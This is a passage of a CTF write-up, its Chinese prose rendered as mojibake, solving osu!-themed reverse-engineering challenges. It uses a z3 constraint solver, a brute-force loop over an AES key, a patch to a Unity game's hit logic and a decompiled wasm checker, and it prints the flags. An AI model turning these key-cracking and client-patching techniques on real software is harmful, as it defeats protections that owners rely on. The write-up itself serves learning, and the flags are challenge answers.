class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = Int(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">t = Int(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">u = Int(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">v = Int(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">w = Int(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z = Int(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sol.add(b + c + w == <span class="number">314</span>)</span><br><span class="line">sol.add(t + d + u == <span class="number">290</span>)</span><br><span class="line">sol.add(p + w + e == <span class="number">251</span>)</span><br><span class="line">sol.add(v + l + j == <span class="number">274</span>)</span><br><span class="line">sol.add(a + t + b == <span class="number">344</span>)</span><br><span class="line">sol.add(b + j + m == <span class="number">255</span>)</span><br><span class="line">sol.add(h + o + u == <span class="number">253</span>)</span><br><span class="line">sol.add(q + l + o == <span class="number">316</span>)</span><br><span class="line">sol.add(a + g + j == <span class="number">252</span>)</span><br><span class="line">sol.add(q + x + q == <span class="number">315</span>)</span><br><span class="line">sol.add(t + n + m == <span class="number">302</span>)</span><br><span class="line">sol.add(d + b + g == <span class="number">328</span>)</span><br><span class="line">sol.add(e + o + m == <span class="number">246</span>)</span><br><span class="line">sol.add(v + v + u == <span class="number">271</span>)</span><br><span class="line">sol.add(f + o + q == <span class="number">318</span>)</span><br><span class="line">sol.add(s + o + j == <span class="number">212</span>)</span><br><span class="line">sol.add(j + j + n == <span class="number">197</span>)</span><br><span class="line">sol.add(s + u + l == <span class="number">213</span>)</span><br><span class="line">sol.add(q + w + j == <span class="number">228</span>)</span><br><span class="line">sol.add(i + d + r == <span class="number">350</span>)</span><br><span class="line">sol.add(e + k + u == <span class="number">177</span>)</span><br><span class="line">sol.add(w + n + a == <span class="number">288</span>)</span><br><span class="line">sol.add(r + e + u == <span class="number">212</span>)</span><br><span class="line">sol.add(q + l + f == <span class="number">321</span>)</span><br><span class="line"></span><br><span class="line">sol.check()</span><br><span class="line">answer = [a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z]</span><br><span class="line"><span class="keyword">while</span> sol.check() == sat:</span><br><span class="line">    m = sol.model()</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> answer:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = m[letter].as_long()</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(value), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    condition = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> m:</span><br><span class="line">        condition.append(d() != m[d])</span><br><span class="line">    sol.add(Or(condition))</span><br><span class="line"><span class="comment"># osu&#123;0rZ_p3PpY_my_s4v1oR&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Reverse-wysi-baby-jsé€†å‘-çˆ†ç ´"><a href="#Reverse-wysi-baby-jsé€†å‘-çˆ†ç ´" class="headerlink" title="Reverse&#x2F;wysi-baby | jsé€†å‘ | çˆ†ç ´"></a>Reverse&#x2F;wysi-baby | jsé€†å‘ | çˆ†ç ´</h2><p>ç½‘ç«™æºç :</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wysi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (combos.<span class="property">length</span> === <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> csr = cs + cs.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> res = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(<span class="string">&quot;5LJJj+x+/cGxhxBTdj/Q2RxkhgbH7v8b/IgX9Kjptpo=&quot;</span>, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(csr + csr), &#123; <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span> &#125;).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">    <span class="comment">// if prefix is &quot;osu&#123;&quot; then its correct</span></span><br><span class="line">    <span class="keyword">if</span> (res.<span class="title function_">startsWith</span>(<span class="string">&quot;osu&#123;&quot;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;music&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;audio src=&quot;./wysi.mp3&quot; autoplay&gt;&lt;/audio&gt;&#x27;</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// reset</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;nope.&quot;</span>);</span><br><span class="line">      combos = [];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  $(<span class="string">&quot;#frame&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="string">&quot;button&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttonValue = $(<span class="variable language_">this</span>).<span class="title function_">data</span>(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    combos.<span class="title function_">push</span>(buttonValue);</span><br><span class="line">    <span class="title function_">wysi</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒé€»è¾‘æ˜¯æ£€æµ‹ç‚¹å‡»çš„æŒ‰é’®æ¥å‘<code>combos</code>å‹å…¥æŒ‰é’®å¯¹åº”çš„å€¼ ç„¶åå½“<code>combos</code>çš„é•¿åº¦ä¸º8æ—¶é€šè¿‡è¿æ¥<code>combos</code>å’Œ<code>combos[::-1]</code> å†è¿æ¥è‡ªèº«æ¥æ„æˆ32ä½å¯†é’¥è¿›è¡ŒAESè§£å¯† ç›´æ¥çˆ†ç ´</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">10</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0</span>; l &lt; <span class="number">10</span>; l++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0</span>; m &lt; <span class="number">10</span>; m++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; <span class="number">10</span>; n++) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">10</span>; o++) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">0</span>; p &lt; <span class="number">10</span>; p++) &#123;</span><br><span class="line">                                combos = [i, j, k, l, m, n, o, p]</span><br><span class="line">                                <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                                <span class="keyword">var</span> csr = cs + cs.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                                <span class="keyword">try</span>&#123;<span class="keyword">var</span> res = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(<span class="string">&quot;5LJJj+x+/cGxhxBTdj/Q2RxkhgbH7v8b/IgX9Kjptpo=&quot;</span>, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(csr + csr), &#123; <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span> &#125;).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);&#125;</span><br><span class="line">                                <span class="keyword">catch</span>(err)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">                                <span class="keyword">if</span> (res.<span class="title function_">startsWith</span>(<span class="string">&quot;osu&#123;&quot;</span>)) &#123;</span><br><span class="line">                                  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// osu&#123;baby_js_osu_web_uwu&#125;</span></span><br></pre></td></tr></table></figure>

<p>(æ­£å¸¸æ¥è¯´å¯ä»¥ç”¨pythonéå†1~100000000é«˜ä½å¡«å……0æ¥è§£å¯† ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡çˆ†å‡ºæ¥)</p>
<h2 id="Reverse-ecs-catch-Unityæ¸¸æˆé€†å‘"><a href="#Reverse-ecs-catch-Unityæ¸¸æˆé€†å‘" class="headerlink" title="Reverse&#x2F;ecs!catch | Unityæ¸¸æˆé€†å‘"></a>Reverse&#x2F;ecs!catch | Unityæ¸¸æˆé€†å‘</h2><p>é¢˜ç›®æè¿°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Receive an SS (with maximum score) on &quot;Bakamitai&quot;, the hardest map, to receive the flag. Shouldn&#x27;t be too difficult, right?</span><br><span class="line"></span><br><span class="line">Note: An SS is not enough! The remote has additional checks for specific scoring (the maximum score if SS&#x27;ed &quot;legitimately&quot;).</span><br><span class="line"></span><br><span class="line">Note: This executable is built for x86 Windows.</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜è¿™æ˜¯32ä½çš„Unityå¼•æ“åˆ¶ä½œçš„æ¸¸æˆ å¹¶ä¸”ç›®æ ‡æ˜¯è¾¾åˆ°æŸä¸ªç‰¹å®šçš„åˆ†å€¼è€Œä¸æ˜¯è¶…è¿‡æŸä¸ªåˆ†å€¼ æ¸¸æˆå°±æ˜¯osuçš„catchæ¨¡å¼ ç›´æ¥æ‰¾åˆ°å’Œç¢°æ’å¤„ç†ç›¸å…³çš„å‡½æ•°<code>OnTriggerEnter2D</code>å’Œ<code>OnTriggerExit2D</code> æ—¢ç„¶æ¸¸æˆè¦è¾¾åˆ°æŸä¸ªåˆ†å€¼è€Œä¸æ˜¯è¶Šé«˜è¶Šå¥½é‚£ä¹ˆç›´æ¥å°†Missedåˆ¤å®šæ¥å…¥Activatoråˆ¤å®šä¸­ åˆ é™¤Missedåˆ¤å®šçš„é€»è¾‘:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-193313.png" alt="image-20240304193305920"></p>
<p>å¦‚æœé‡åˆ°ç®­å¤´æŒ‡çš„å¯¹è±¡æŠ¥é”™å°±å…ˆå¯¼å…¥<code>UnityEngine.dll</code> ç„¶åä¿å­˜æ¨¡å—è¿›å…¥æ¸¸æˆæŒ‰é¢˜ç›®çš„è¦æ±‚æ‰“éš¾åº¦æœ€é«˜çš„æ­Œæ‹¿åˆ°flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-193712.png" alt="image-20240304193712962"></p>
<h2 id="Reverse-wysi-revenge-jsé€†å‘-wasm"><a href="#Reverse-wysi-revenge-jsé€†å‘-wasm" class="headerlink" title="Reverse&#x2F;wysi-revenge | jsé€†å‘ | wasm"></a>Reverse&#x2F;wysi-revenge | jsé€†å‘ | wasm</h2><p>ç½‘ç«™æºç :</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wysi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (combos.<span class="property">length</span> === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title class_">Module</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">mod</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> ck = mod.<span class="title function_">cwrap</span>(<span class="string">&#x27;checker&#x27;</span>, <span class="string">&#x27;boolean&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">ck</span>(cs,  cs.<span class="property">length</span>)) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;music&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;audio src=&quot;./wysi.mp3&quot; autoplay&gt;&lt;/audio&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;osu&#123;&quot;</span> + cs + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;nope.&quot;</span>);</span><br><span class="line">        combos = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  $(<span class="string">&quot;#frame&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="string">&quot;button&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttonValue = $(<span class="variable language_">this</span>).<span class="title function_">data</span>(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    combos.<span class="title function_">push</span>(buttonValue);</span><br><span class="line">    <span class="title function_">wysi</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬é€»è¾‘ç±»ä¼¼<code>wysi-baby</code> ä½†æ˜¯ä½¿ç”¨åˆ°äº†Jså†…è”C&#x2F;C++ æ‰€ä»¥éƒ¨åˆ†åŠŸèƒ½æ˜¯ç”±wasmå®ç°çš„(è¿™ä¸€ç‚¹é€šè¿‡ç½‘é¡µå¼€å‘è€…å·¥å…·è°ƒè¯•å¾—çŸ¥) ä¸€è·¯æ­¥å…¥åˆ°æ ¸å¿ƒæ£€æŸ¥é€»è¾‘<code>cheker()</code>å‘ç°å­˜åœ¨äº<code>checker.wasm</code> å¤åˆ¶ä»£ç ä¿å­˜åˆ°æœ¬åœ°ä¸º<code>.wat</code>(æ˜æ–‡å½¢å¼çš„wasmä»£ç ) ç”¨wabtå·¥å…·ç®±å°†å…¶è½¬åŒ–ä¸ºå¯è¯»æ€§æ›´é«˜çš„<code>.o</code>æ–‡ä»¶ å¾—åˆ°åŸå§‹ä»£ç :</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> memory <span class="title function_">memory</span>(<span class="attr">initial</span>: <span class="number">256</span>, <span class="attr">max</span>: <span class="number">32768</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_a</span>:int = <span class="number">65536</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_b</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_c</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_d</span>:int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> table <span class="attr">indirect_function_table</span>:<span class="title function_">funcref</span>(<span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">wasm_call_ctors</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">emscripten_stack_init</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f_b</span>(<span class="params">a:int, b:int, c:int, d:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">e</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:&#123; <span class="attr">a</span>:int, <span class="attr">b</span>:int, <span class="attr">c</span>:int, <span class="attr">d</span>:int &#125; = e - f;</span><br><span class="line">  g.<span class="property">d</span> = a;</span><br><span class="line">  g.<span class="property">c</span> = b;</span><br><span class="line">  g.<span class="property">b</span> = c;</span><br><span class="line">  g.<span class="property">a</span> = d;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int = g.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = <span class="number">22</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = h;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = i;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = j == k;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = l &amp; n;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:int = m;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(o)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = g.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">r</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">s</span>:int = q + r;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">t</span>:int = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">u</span>:int = s;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">v</span>:int = t;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">w</span>:int = u == v;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">x</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">y</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">z</span>:int = w &amp; y;</span><br><span class="line">  p = x;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(z)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">aa</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ba</span>:int = g.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ca</span>:int = aa * ba;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">da</span>:int = <span class="number">168</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ea</span>:int = ca;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fa</span>:int = da;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ga</span>:int = ea == fa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ha</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ja</span>:int = ga &amp; ia;</span><br><span class="line">  p = ha;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(ja)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ka</span>:int = g.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">la</span>:int = g.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ma</span>:int = ka + la;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">na</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = ma + na;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = g.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = oa + pa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = <span class="number">66</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = ra;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = sa == ta;</span><br><span class="line">  p = ua;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = p;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = va &amp; wa;</span><br><span class="line">  <span class="keyword">return</span> xa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f_c</span>(<span class="params">a:int, b:int, c:int, d:int, e:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int_ptr = f - g;</span><br><span class="line">  h[<span class="number">7</span>] = a;</span><br><span class="line">  h[<span class="number">6</span>] = b;</span><br><span class="line">  h[<span class="number">5</span>] = c;</span><br><span class="line">  h[<span class="number">4</span>] = d;</span><br><span class="line">  h[<span class="number">3</span>] = e;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = i + j;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = k + l;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = m + n;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = o + p;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">r</span>:int = <span class="number">71</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">s</span>:int = q;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">t</span>:int = r;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">u</span>:int = s == t;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">v</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">w</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">x</span>:int = u &amp; w;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">y</span>:int = v;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(x)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">z</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">aa</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ba</span>:int = z * aa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ca</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">da</span>:int = ba * ca;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ea</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fa</span>:int = da * ea;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ga</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ha</span>:int = fa * ga;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">449280</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ja</span>:int = ha;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ka</span>:int = ia;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">la</span>:int = ja == ka;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ma</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">na</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = la &amp; na;</span><br><span class="line">  y = ma;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(oa)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = pa * qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = sa * ta;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = ra + ua;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = <span class="number">724</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = va;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ya</span>:int = wa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">za</span>:int = xa == ya;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ab</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cb</span>:int = za &amp; bb;</span><br><span class="line">  y = ab;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(cb)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">db</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">eb</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fb</span>:int = db * eb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gb</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hb</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ib</span>:int = gb * hb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jb</span>:int = fb + ib;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kb</span>:int = <span class="number">313</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lb</span>:int = jb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mb</span>:int = kb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nb</span>:int = lb == mb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ob</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qb</span>:int = nb &amp; pb;</span><br><span class="line">  y = ob;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(qb)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">rb</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sb</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">tb</span>:int = rb * sb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ub</span>:int = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">vb</span>:int = tb;</span><br><span class="line">  <span 